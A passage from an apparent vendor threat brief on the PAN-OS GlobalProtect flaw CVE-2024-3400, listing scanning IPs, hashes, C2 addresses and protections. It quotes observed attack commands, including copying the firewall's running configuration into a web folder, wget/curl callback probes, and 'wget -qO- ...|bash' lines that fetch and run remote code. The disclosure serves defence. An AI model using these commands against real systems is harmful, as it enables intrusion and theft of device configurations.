<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.181.70[.]3</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">149.28.194[.]95</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">78.141.232[.]174</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.180.128[.]159</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">64.176.226[.]203</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.180.106[.]167</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">173.255.223[.]159</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.60.218[.]153</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">185.108.105[.]110</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">146.70.192[.]174</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">149.88.27[.]212</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">154.223.16[.]34</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">38.180.41[.]251 </span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">203.160.86[.]91</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">45.121.51[.]2</span></li>
</ul>
<p><span style="font-weight: 400;">From our analysis, we do not see any additional activity from these IP addresses outside probing the vulnerability to determine either if the firewall is vulnerable or compromised. We have seen the following commands within the exploit attempts that the threat prevention signature is blocking:</span></p>
<ul>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">touch [snip]/global-protect/index.css</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">touch [snip]/global-protect/portal/css/test.min.css</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">cp [snip]/running-config.xml [snip]/global-protect/[16 random characters].css</span></li>
</ul>
<p>The commands above show two examples of the use of the touch command to create an empty file in the web application folder. The client would then attempt to access this file via an HTTP request to determine if exploitation was successful. The third command shows a bit more malicious behavior, which involves copying the running configuration to the web application folder for access.</p>
<p><span style="font-weight: 400;">We have also seen probing attempts that use either <span style="font-family: 'courier new', courier, monospace;">wget </span>or <span style="font-family: 'courier new', courier, monospace;">curl </span>to access remote servers that an external party would use the outbound HTTP request to determine successful exploitation and command execution:</span></p>
<ul>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">wget srgsd1f.842b727ba4.ipv6.1433.eu[.]org</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">wget edcjn.57fe6f5d9d.ipv6.1433.eu[.]org</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">curl srgsdf.842b727ba4.ipv6.1433.eu[.]org</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">wget --no-check-certificate https://45.121.51[.]2/abc.txt</span></li>
</ul>
<h2><a id="post-133365-_6kajjrwpgjuu"></a>Conclusion</h2>
<p>The <a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener">Security Advisory</a> will continue to provide up-to-date information on impacts to Palo Alto Networks products and recommended mitigations. We will continue to update this threat brief with information on exploitation.</p>
<p>Again, Palo Alto Networks would like to thank Volexity for finding this issue and their continuing coordination and partnership. <span style="font-weight: 400;">Please reference </span><a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400" target="_blank" rel="noopener"><span style="font-weight: 400;">Volexity's blog</span></a><span style="font-weight: 400;"> for their analysis.</span></p>
<p>Palo Alto Networks has shared our findings with our fellow Cyber Threat Alliance (CTA) members. CTA members use this intelligence to rapidly deploy protections to their customers and to systematically disrupt malicious cyber actors. Learn more about the <a href="https://www.cyberthreatalliance.org/" target="_blank" rel="noopener">Cyber Threat Alliance</a>.</p>
<p>Protections and mitigations for the observed exploitation activity are below and will be updated as more become available.</p>
<h2><a id="post-133365-_lqzcx8cug942"></a>Palo Alto Networks Product Protections for CVE-2024-3400</h2>
<p>Palo Alto Networks customers can leverage a variety of product protections and updates to identify and defend against this threat.</p>
<p><span style="font-weight: 400;">If you think you may have been compromised or have an urgent matter, get in touch with </span><a href="https://support.paloaltonetworks.com/" target="_blank" rel="noopener"><span style="font-weight: 400;">Palo Alto Networks support</span></a><span style="font-weight: 400;">.</span></p>
<h3><a id="post-133365-_jlr298x3ynzm"></a>Next-Generation Firewalls and Prisma Access With Advanced Threat Prevention</h3>
<p><a href="https://docs.paloaltonetworks.com/ngfw" target="_blank" rel="noopener">Next-Generation Firewall</a> with the <a href="https://docs.paloaltonetworks.com/advanced-threat-prevention/administration" target="_blank" rel="noopener">Advanced Threat Prevention</a> security subscription can help block exploitation of CVE-2024-3400 via Threat Prevention signature<span style="font-weight: 400;">s </span><a href="https://threatvault.paloaltonetworks.com/?query=95187" target="_blank" rel="noopener"><span style="font-weight: 400;">95187</span></a><span style="font-weight: 400;">,</span> <a href="https://threatvault.paloaltonetworks.com/?query=95189" target="_blank" rel="noopener"><span style="font-weight: 400;">95189</span></a> <span style="font-weight: 400;">and</span> <a href="https://threatvault.paloaltonetworks.com/?query=95191" target="_blank" rel="noopener"><span style="font-weight: 400;">95191</span></a><span style="font-weight: 400;">.</span></p>
<h3><a id="midnightcortex"></a><strong>Cortex XDR, XSIAM and the Unified Cloud Agent </strong></h3>
<p><a href="https://docs-cortex.paloaltonetworks.com/p/XDR" target="_blank" rel="noopener"><span style="font-weight: 400;">Cortex XDR</span></a><span style="font-weight: 400;"> and </span><a href="https://docs-cortex.paloaltonetworks.com/p/XSIAM" target="_blank" rel="noopener"><span style="font-weight: 400;">XSIAM</span></a><span style="font-weight: 400;"> agents and analytics help protect and detect against post-exploitation activity if an attacker tries to enumerate or laterally move to other assets.</span></p>
<h3><a id="midnightxpanse"></a>Cortex Xpanse and XSIAM ASM Module</h3>
<p><a href="https://docs-cortex.paloaltonetworks.com/p/XPANSE" target="_blank" rel="noopener"><span style="font-weight: 400;">Cortex Xpanse</span></a><span style="font-weight: 400;"> has the ability to identify exposed </span><span style="font-weight: 400;">Palo Alto Networks GlobalProtect </span><span style="font-weight: 400;">devices on the public internet and escalate these findings to defenders. Customers can enable alerting on this risk by ensuring that the </span><span style="font-weight: 400;">Palo Alto Networks GlobalProtect</span><span style="font-weight: 400;"> Attack Surface Rule is enabled. Identified findings can either be viewed in the Threat Response Center or in the incident view of Expander. These findings are also available for Cortex XSIAM customers who have purchased the ASM module.</span></p>
<h2><a id="post-133365-_ydqdbjg0dngh"></a>Indicators of Compromise</h2>
<h3><a id="post-133365-_er0ielbteqex"></a>UPSTYLE Backdoor</h3>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">3de2a4392b8715bad070b2ae12243f166ead37830f7c6d24e778985927f9caac</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">5460b51da26c060727d128f3b3d6415d1a4c25af6a29fef4cc6b867ad3659078</span></li>
</ul>
<h3><a id="post-133365-_sud9zyc1j4ru"></a>Command and Control Infrastructure</h3>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">172.233.228[.]93</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">hxxp://172.233.228[.]93/policy</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">hxxp://172.233.228[.]93/patch</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">66.235.168[.]222</span></li>
</ul>
<h3><a id="post-133365-_howcpn9g6pxj"></a>Hosted Python Backdoor</h3>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">144.172.79[.]92</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">nhdata.s3-us-west-2.amazonaws[.]com</span></li>
</ul>
<h3><a id="post-133365-_vvcm1drotig6"></a>Observed Commands</h3>
<ul>
<li><span style="font-family: 'courier new', courier, monospace;">wget -qO- hxxp://172.233.228[.]93/patch|bash</span></li>
<li><span style="font-family: 'courier new', courier, monospace;">wget -qO- hxxp://172.233.228[.]93/policy | bash</span></li>
<li><span style="font-weight: 400; font-family: 'courier new', courier, monospace;">"failed to unmarshal session(.\+.\/" mp-log gpsvc.log* (</span><span style="font-weight: 400;">Please see our </span><a href="https://security.paloaltonetworks.com/CVE-2024-3400"><span style="font-weight: 400;">Security Advisory</span></a><span style="font-weight: 400;"> for further information on this command.)</span></li>
</ul>
<h2><a id="midnightresources"></a>Additional Resources</h2>
<ul>
<li aria-level="1"><a href="https://thecyberwire.com/podcasts/threat-vector/21/notes" target="_blank" rel="noopener">Understanding the Midnight Eclipse Activity and CVE 2024-3400</a> – Unit 42 Threat Vector podcast, Episode 21, Palo Alto Networks</li>
<li aria-level="1"><a href="https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA14u000000CrO6CAK" target="_blank" rel="noopener">How to Remedy CVE-2024-3400</a> – Knowledge Base, Palo Alto Networks Customer Support Portal</li>
<li aria-level="1"><a href="https://www.paloaltonetworks.com/blog/2024/04/more-on-the-pan-os-cve/" target="_blank" rel="noopener"><span style="font-weight: 400;">More on the PAN-OS CVE-2024-3400</span></a><span style="font-weight: 400;"> – Palo Alto Networks Blog</span></li>
<li style="font-weight: 400;" aria-level="1"><a href="https://security.paloaltonetworks.com/CVE-2024-3400" target="_blank" rel="noopener"><span style="font-weight: 400;">CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection Vulnerability in GlobalProtect</span></a><span style="font-weight: 400;"> – Palo Alto Networks</span></li>
<li style="font-weight: 400;" aria-level="1"><a href="https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/" target="_blank" rel="noopener"><span style="font-weight: 400;">Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400)</span></a><span style="font-weight: 400;"> – Volexity</span></li>
<li style="font-weight: 400;" aria-level="1"><a href="https://www.cisa.gov/news-events/alerts/2024/04/12/palo-alto-networks-releases-guidance-vulnerability-pan-os-cve-2024-3400" target="_blank" rel="noopener">Palo Alto Networks Releases Guidance for Vulnerability in PAN-OS, CVE-2024-3400</a> – Cybersecurity and Infrastructure Security Agency (CISA)</li>
</ul>
<h2><a id="midnightupdatelog"></a>Update Log</h2>
<ul>
<li class="p1">Updated April 12, 2024, at 10:15 a.m. PT to add Cortex XDR and XSIAM product protections, as well as Additional Resources.</li>
<li>Updated April 12, 2024, at 12:45 a.m. PT to add Cortex Xpanse product protections.</li>
<li>Updated April 14, 2024, at 11:05 a.m. PT to clarify impact on GlobalProtect portal configurations.</li>
<li>Updated April 14, 2024, at 7:55 p.m. PT to reflect that hotfixes are in place and ETAs added in our Security Advisory for upcoming hotfixes.</li>
<li>Updated April 15, 2024, at 8:35 a.m. PT to update exploitation activity in Executive Summary.</li>
<li>Updated April 15, 2024, at 9:16 a.m. PT to update language on Threat ID 95187 in the Executive Summary, including information on firewalls managed by Panorama.</li>
<li>Updated April 16, 2024, at 7:45 a.m. PT to add Additional Exploitation Observations section with IoCs and commands.</li>
<li>Updated April 16, 2024, at 9:48 a.m. PT to remove update.py filename from list of indicators.</li>
<li>Updated April 16, 2024, at 2:00 p.m. PT to update the Executive Summary and Mitigations section to add new mitigation guidance, a new Threat Prevention signature and availability of PAN-OS fixes.</li>
<li>Updated April 16, 2024, at 2:40 p.m. PT to align the Executive Summary and Details of the Vulnerability sections more closely to the Security Advisory.</li>
<li>Updated April 17, 2024, at 6:15 a.m. PT to add Threat ID 95191.</li>
<li>Updated April 17, 2024, at 11:30 a.m. PT to add an additional bullet to the Observed Commands subsection.</li>
<li>Updated April 17, 2024, at 12:23 p.m. PT to clarify contact information.</li>
<li>Updated April 19, 2024, at 12:45 p.m. PT to heavily revise the Current Scope of Attack section as well the section on Operation MidnightEclipse activity (UPSTYLE and Cron Job Backdoor Activity).</li>
<li>Updated April 22, 2024, at 3:15 p.m. PT to more thoroughly define the levels of activity seen in the Current Scope of the Attack section.</li>
<li>Updated April 23, 2024, at 7:40 a.m. PT to add language to recommendations for Level 2 and Level 3 in Scope of Attack section. Clarified language in Guidance section. Added Update Log section.</li>
<li>Updated Apr 24, 2024, at 7:10 a.m. PT to include a link to a Customer Support Portal Knowledge Base article.</li>
<li><span style="font-weight: 400;">Updated April 24, 2024, at 6:15 p.m. PT to include updated XQL queries for hits for known IoCs in NGFW traffic and in XDR telemetry and NGFW telemetry.</span></li>
<li>Updated April 25, 2024, at 8:00 a.m. PT to add Knowledge Base article to Additional Resources.</li>
<li>Updated April 26, 2024, at 12:22 p.m. PT for clarity and consistency.</li>
<li>Updated April 29, 2024, at 6:52 a.m. to add Unit 42 Threat Vector podcast on the vulnerability to Additional Resources.</li>
<li>Updated April 29, 2024, at 11:55 a.m. PT to update exploitation status about proof of concept by third parties of post-exploit persistence techniques.</li>
<li><span style="font-weight: 400;">Updated May 1, 2024, at 8:05 a.m. PT for clarity and consistency.</span></li>
<li>Updated May 3, 2024, at 7:25 a.m. PT to note additional mitigation information for customers was added to the Security Advisory.</li>
<li>Updated May 20, 2024, at 8:10 a.m. PT to adjust second threat hunting query.</li>
</ul>
      
              </div>
              <!--<span class="post__date">Updated 30 July, 2024 at 11:24 AM PDT</span>-->
              <button class="l-btn back-to-top" id="backToTop" data-page-track="true" data-page-track-value="cve-2024-3400:back to top">Back to top</button>
              
			<div class="be__tags-wrapper"> 
				<h3>Tags</h3><ul role="list"><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/backdoor/" role="link" title="backdoor" data-page-track="true" data-page-track-value="cve-2024-3400:tags:backdoor">Backdoor</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/command-injection/" role="link" title="Command injection" data-page-track="true" data-page-track-value="cve-2024-3400:tags:Command injection">Command injection</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/cve-2024-3400/" role="link" title="CVE-2024-3400" data-page-track="true" data-page-track-value="cve-2024-3400:tags:CVE-2024-3400">CVE-2024-3400</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/midnighteclipse/" role="link" title="MidnightEclipse" data-page-track="true" data-page-track-value="cve-2024-3400:tags:MidnightEclipse">MidnightEclipse</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/python/" role="link" title="Python" data-page-track="true" data-page-track-value="cve-2024-3400:tags:Python">Python</a></li><li role="listitem"><a href="https://unit42.paloaltonetworks.com/tag/upstyle/" role="link" title="Upstyle" data-page-track="true" data-page-track-value="cve-2024-3400:tags:Upstyle">Upstyle</a></li></ul>
			</div> 
              <div class="be__post-nav">
    <a class="prev" href="https://unit42.paloaltonetworks.com" role="link" title="Threat Research" data-page-track="true" data-page-track-value="cve-2024-3400:article-nav:Threat Research Center"> 
        <span>Threat Research Center</span>
    </a>
            <a class="next" href="https://unit42.paloaltonetworks.com/muddled-libra-evolution-to-cloud/" role="link" title="Muddled Libra’s Evolution to the Cloud" data-page-track="true" data-page-track-value="cve-2024-3400:article-nav:Muddled Libra’s Evolution to the Cloud"> 
            <span>Next: Muddled Libra’s Evolution to the Cloud</span>
        </a>
    </div>
 
            </div>
            <div class="be__nav">
            <div class="be__nav-wrapper">
      <div class="be-table-of-contents" data-toc-track="cve-2024-3400:sidebar:table-of-contents">
      <div class="be-title__wrapper">
        <h3>Table of Contents</h3>
      </div> 
            <ul>
        <li></li>
      </ul>
    </div>
   
        <div class="be-related-articles">
        <h3>Related Articles</h3>
        <ul> 
                        <li>
                  <a href="https://unit42.paloaltonetworks.com/unique-popular-techniques-lateral-movement-macos/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="cve-2024-3400:sidebar:related-articles:Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples">
                      Lateral Movement on macOS: Unique and Popular Techniques and In-the-Wild Examples                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/silent-skimmer-latest-campaign/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="cve-2024-3400:sidebar:related-articles:Silent Skimmer Gets Loud (Again)">
                      Silent Skimmer Gets Loud (Again)                  </a>
              </li>
                            <li>
                  <a href="https://unit42.paloaltonetworks.com/north-korean-threat-actors-lure-tech-job-seekers-as-fake-recruiters/" role="link" title="article - table of contents" data-page-track="true" data-page-track-value="cve-2024-3400:sidebar:related-articles:Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware">
                      Contagious Interview: DPRK Threat Actors Lure Tech Industry Job Seekers to Install New Variants of BeaverTail and InvisibleFerret Malware                  </a>
              </li>
                      </ul>
      </div>
      </div> 
            </div>
          </div>
        </div>
          <div class="pa related-threat">
    <div class="l-container">
            <h2>Related  Resources</h2>
      <div class="blog-slider" id="blogSlider"> 
                    <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900-786x368.jpg" class="lozad" alt="A pictorial representation of a jailbreaking technique. Abstract digital tunnel with glowing blue lights and intricate patterns, representing data or technology." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/13_Security-Technology_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-31T23:00:16+00:00">December 31, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability">
                    <h4 class="post-title">Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/genai/" title="GenAI" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability:GenAI">GenAI</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/prompt-injection/" title="prompt injection" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability:prompt injection">Prompt injection</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/jailbroken/" title="jailbroken" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability:jailbroken">Jailbroken</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/multi-turn-technique-jailbreaks-llms/" title="Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Bad Likert Judge: A Novel Multi-Turn Technique to Jailbreak LLMs by Misusing Their Evaluation Capability:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of using LLMs to obfuscate malicious JavaScript detection. A man wearing glasses, looking intently at a screen with reflections visible in the glasses of computer code." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/04_Tutorial_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-20T11:00:39+00:00">December 20, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript">
                    <h4 class="post-title">Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/credential-stealer/" title="credential stealer" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript:credential stealer">Credential stealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/data-augmentation/" title="Data Augmentation" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript:Data Augmentation">Data Augmentation</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/fraudgpt/" title="FraudGPT" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript:FraudGPT">FraudGPT</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/using-llms-obfuscate-malicious-javascript/" title="Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Now You See Me, Now You Don’t: Using LLMs to Obfuscate Malicious JavaScript:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of attackers leveraging Active Directory or LDAP. Close-up view of a server rack panel with illuminated lights and a digital display reading &#039;SYSTEM HACKED&#039;." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/02_Vulnerabilities_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-17T23:00:43+00:00">December 17, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory">
                    <h4 class="post-title">LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/stately-taurus/" title="Stately Taurus" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:Stately Taurus">Stately Taurus</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/alphv/" title="ALPHV" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:ALPHV">ALPHV</a>
				</li></ul>                </div>
                <div class="card-content__link">
                                    <a class="hyperlink" href="https://unit42.paloaltonetworks.com/lightweight-directory-access-protocol-based-attacks/" title="LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:LDAP Enumeration: Unveiling the Double-Edged Sword of Active Directory:read now">
                    Read now                    <img src="https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v6/dist/images/icons/icon-right-arrow-withtail.svg" alt="Right arrow">
                  </a>
                </div>
              </div>
            </div>
                                <div class="pa l-card l-card--slider" >
              <div class="card-media " >
                              <figure>
                <img width="786" height="368" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-786x368.jpg" class="lozad" alt="Pictorial representation of HeartCrypt. A laptop on a desk displaying a vivid graphical interface with cyber security and data analytics themes, illuminated by red ambient lighting." decoding="async" data-srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-786x368.jpg 786w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-1493x700.jpg 1493w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-768x360.jpg 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900-1536x720.jpg 1536w, https://unit42.paloaltonetworks.com/wp-content/uploads/2024/12/03_Malware_Category_1920x900.jpg 1920w" sizes="(max-width: 786px) 100vw, 786px" />                </figure> 
                            </div>
              <div class="card-content">
                <div class="card-content__wrapper">
                  <a class="card-category" href="https://unit42.paloaltonetworks.com/category/threat-research/" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Threat Research"><span class=""><img class="lozad" data-src="https://unit42.paloaltonetworks.com/wp-content/uploads/2024/06/icon-threat-research.svg" alt=" category icon">Threat Research</span></a>                        <span class="post-pub-date"><time datetime="2024-12-13T23:00:21+00:00">December 13, 2024</time></span>
                  <a href="https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation">
                    <h4 class="post-title">Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation</h4>
                  </a>
                  <ul class="card-tags" role="list">
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/redline-infostealer/" title="Redline infostealer" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Redline infostealer">Redline infostealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/lumma-stealer/" title="Lumma Stealer" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Lumma Stealer">Lumma Stealer</a>
				</li>
				<li role="listitem">
					<a href="https://unit42.paloaltonetworks.com/tag/remcos/" title="Remcos" role="link" data-page-track="true" data-page-track-value="cve-2024-3400:related-resources:Crypted Hearts: Exposing the HeartCrypt Packer-as-a-Service Operation:Remcos">Remcos</a>
				</li></ul>                </div>
                <div class="card-content__link">
